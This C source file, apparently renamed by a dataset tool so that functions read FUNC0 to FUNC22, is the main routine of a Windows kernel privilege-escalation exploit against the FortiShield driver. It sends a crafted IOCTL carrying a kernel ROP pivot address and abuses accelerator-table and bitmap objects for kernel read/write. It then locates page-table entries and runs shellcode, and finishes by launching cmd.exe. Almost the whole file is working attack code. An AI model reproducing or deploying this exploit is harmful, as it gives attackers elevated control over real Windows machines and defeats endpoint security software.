#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
struct bitmap_structure {int /*<<< orphan*/  worker_bitmap; int /*<<< orphan*/  manager_bitmap; } ;
typedef  int ULONGLONG ;
struct TYPE_3__ {scalar_t__ pHeader; } ;
typedef  TYPE_1__* PHANDLEENTRY ;
typedef  scalar_t__ LPVOID ;
typedef  int /*<<< orphan*/  LPTHREAD_START_ROUTINE ;
typedef  int /*<<< orphan*/  LPDWORD ;
typedef  int /*<<< orphan*/  LPCSTR ;
typedef  scalar_t__ HANDLE ;
typedef  scalar_t__ HACCEL ;
typedef  int DWORD ;
typedef  scalar_t__ BOOL ;

/* Variables and functions */
 int /*<<< orphan*/  CREATE_SUSPENDED ; 
 scalar_t__ FUNC0 (int /*<<< orphan*/ ,int,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 scalar_t__ FUNC1 (int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC3 (scalar_t__,int,scalar_t__,int,scalar_t__,int,int*,int /*<<< orphan*/ *) ; 
 int GENERIC_READ ; 
 int GENERIC_WRITE ; 
 scalar_t__ FUNC4 (char*) ; 
 int FUNC5 () ; 
 int /*<<< orphan*/  INFINITE ; 
 scalar_t__ INVALID_HANDLE_VALUE ; 
 void* FUNC6 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  MEM_RELEASE ; 
 int /*<<< orphan*/  OPEN_EXISTING ; 
 int /*<<< orphan*/  FUNC7 (scalar_t__) ; 
 scalar_t__ FUNC8 (scalar_t__,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  THREAD_PRIORITY_HIGHEST ; 
 scalar_t__ FUNC9 (scalar_t__,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC10 (scalar_t__,int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC11 (scalar_t__,int,int,int,int) ; 
 scalar_t__ FUNC12 (scalar_t__,int,int,int) ; 
 int /*<<< orphan*/  FUNC13 (scalar_t__*,int) ; 
 struct bitmap_structure FUNC14 (scalar_t__*) ; 
 int FUNC15 (int,int) ; 
 int /*<<< orphan*/  FUNC16 () ; 
 int /*<<< orphan*/  FUNC17 (int /*<<< orphan*/ *,scalar_t__*,TYPE_1__**) ; 
 int /*<<< orphan*/ * ntdll ; 
 int object_number ; 
 int /*<<< orphan*/  FUNC18 (char*,...) ; 
 int FUNC19 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC20 (char*) ; 
 int /*<<< orphan*/  trigger_callback ; 
 int /*<<< orphan*/ * user32dll ; 
 int /*<<< orphan*/  FUNC21 (int /*<<< orphan*/ ,int) ; 

int FUNC22() {
	ntdll = FUNC6((LPCSTR)"ntdll");
	if (ntdll == NULL) {
		FUNC18("[!] Error while loading ntdll: %d\n", FUNC5());
		return 1;
	}

	user32dll = FUNC6((LPCSTR)"user32");
	if (user32dll == NULL) {
		FUNC18("[!] Error while loading user32: %d.\n", FUNC5());
		return 1;
	}

	HACCEL hAccel[object_number];
	FUNC13(hAccel, object_number);

	PHANDLEENTRY handle_entry[object_number];
	FUNC17(user32dll, hAccel, handle_entry);

	FUNC18(
		"[+] Accelerator Table[0] HANDLE: %I64x\n"
		"[+] Accelerator Table[0] HANDLE: %I64x\n"
		"[+] Accelerator Table[0] kernel address: %I64x\n"
		"[+] Accelerator Table[0] kernel address: %I64x\n",
		(ULONGLONG)hAccel[0],
		(ULONGLONG)hAccel[1],
		(ULONGLONG)handle_entry[0]->pHeader,
		(ULONGLONG)handle_entry[1]->pHeader
	);

	ULONGLONG manager_pvScan_offset;
	ULONGLONG worker_pvScan_offset;
	manager_pvScan_offset = (ULONGLONG)handle_entry[0]->pHeader + 0x18 + 0x38;
	worker_pvScan_offset = (ULONGLONG)handle_entry[1]->pHeader + 0x18 + 0x38;

	FUNC18("[+] Replacing Accelerator Tables with BitMap objects\n");
	struct bitmap_structure bitmaps;
	bitmaps = FUNC14(hAccel);

	FUNC18("[+] Manager BitMap pvScan0 offset: %I64x\n", (ULONGLONG)manager_pvScan_offset);
	FUNC18("[+] Worker BitMap pvScan0 offset: %I64x\n", (ULONGLONG)worker_pvScan_offset);

	HANDLE forti;
	forti = FUNC0((LPCSTR)"\\\\.\\FortiShield", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (forti == INVALID_HANDLE_VALUE) {
		FUNC18("[!] Error while creating a handle to the driver: %d\n", FUNC5());
		return 1;
	}

	LPVOID kernel_base = FUNC4("ntoskrnl.exe");
	LPVOID fortishield_base = FUNC4("FortiShield.sys");
	ULONGLONG kernel_pivot = (ULONGLONG)kernel_base + 0x4efae5;
	ULONGLONG fortishield_callback = (ULONGLONG)fortishield_base + 0xd150;
	ULONGLONG fortishield_restore = (ULONGLONG)fortishield_base + 0x2f73;
	FUNC18("[+] Kernel found at: %llx\n", (ULONGLONG)kernel_base);
	FUNC18("[+] FortiShield.sys found at: %llx\n", (ULONGLONG)fortishield_base);

	DWORD IoControlCode = 0x220028;
	ULONGLONG InputBuffer = kernel_pivot;
	DWORD InputBufferLength = 0x8;
	ULONGLONG OutputBuffer = 0x0;
	DWORD OutputBufferLength = 0x0;
	DWORD lpBytesReturned;

	LPVOID rop_chain_allocation;
	rop_chain_allocation = FUNC11(kernel_base, fortishield_callback, fortishield_restore, manager_pvScan_offset, worker_pvScan_offset);

	HANDLE hThread;
	LPDWORD hThread_id = 0;
	hThread = FUNC1(NULL, 0, (LPTHREAD_START_ROUTINE)&trigger_callback, NULL, CREATE_SUSPENDED, hThread_id);
	if (hThread == NULL)
	{
		FUNC18("[!] Error while calling CreateThread: %d\n", FUNC5());
		return 1;
	}

	BOOL hThread_priority;
	hThread_priority = FUNC8(hThread, THREAD_PRIORITY_HIGHEST);
	if (hThread_priority == 0)
	{
		FUNC18("[!] Error while calling SetThreadPriority: %d\n", FUNC5());
		return 1;
	}

	
	FUNC18("[+] Press ENTER to trigger the vulnerability.\n");
	FUNC16();
	

	BOOL triggerIOCTL;
	FUNC7(hThread);
	triggerIOCTL = FUNC3(forti, IoControlCode, (LPVOID)&InputBuffer, InputBufferLength, (LPVOID)&OutputBuffer, OutputBufferLength, &lpBytesReturned, NULL);
	FUNC10(hThread, INFINITE);

	/* <Reading the PTE base virtual address from nt!MiGetPteAddress + 0x13> */
	ULONGLONG manager_write_pte_offset = (ULONGLONG)kernel_base + 0x47314 + 0x13;

	FUNC18("[+] Writing nt!MiGetPteAddress + 0x13 to Worker pvScan0.\n");
	FUNC16();
	FUNC21(bitmaps.manager_bitmap, manager_write_pte_offset);

	FUNC18("[+] Reading from Worker pvScan0.\n");
	FUNC16();
	ULONGLONG pte_start = FUNC19(bitmaps.worker_bitmap);
	FUNC18("[+] PTE virtual base address: %I64x\n", pte_start);

	ULONGLONG pte_result;
	ULONGLONG pte_value = 0x8b000000;
	pte_result = FUNC15(pte_value, pte_start);
	FUNC18("[+] PTE virtual address for 0x8b000000: %I64x\n", pte_result);
	/* </Reading the PTE base virtual address from nt!MiGetPteAddress + 0x13> */

	BOOL VFresult;
	VFresult = FUNC9(rop_chain_allocation, 0x0, MEM_RELEASE);
	if (VFresult == 0)
	{
		FUNC18("[!] Error while calling VirtualFree: %d\n", FUNC5());
		return 1;
	}

	LPVOID shellcode_allocation;
	shellcode_allocation = FUNC12(kernel_base, fortishield_callback, fortishield_restore, pte_result);

	hThread = FUNC1(NULL, 0, (LPTHREAD_START_ROUTINE)&trigger_callback, NULL, CREATE_SUSPENDED, hThread_id);
	if (hThread == NULL)
	{
		FUNC18("[!] Error while calling CreateThread: %d\n", FUNC5());
		return 1;
	}

	hThread_priority = FUNC8(hThread, THREAD_PRIORITY_HIGHEST);
	if (hThread_priority == 0)
	{
		FUNC18("[!] Error while calling SetThreadPriority: %d\n", FUNC5());
		return 1;
	}

	FUNC18("[+] Press ENTER to trigger the vulnerability again.\n");
	FUNC16();

	FUNC7(hThread);
	triggerIOCTL = FUNC3(forti, IoControlCode, (LPVOID)&InputBuffer, InputBufferLength, (LPVOID)&OutputBuffer, OutputBufferLength, &lpBytesReturned, NULL);
	FUNC10(hThread, INFINITE);
	
	FUNC18("\n");
	FUNC20("start cmd.exe");
	FUNC2(bitmaps.manager_bitmap);
	FUNC2(bitmaps.worker_bitmap);

	return 0;
}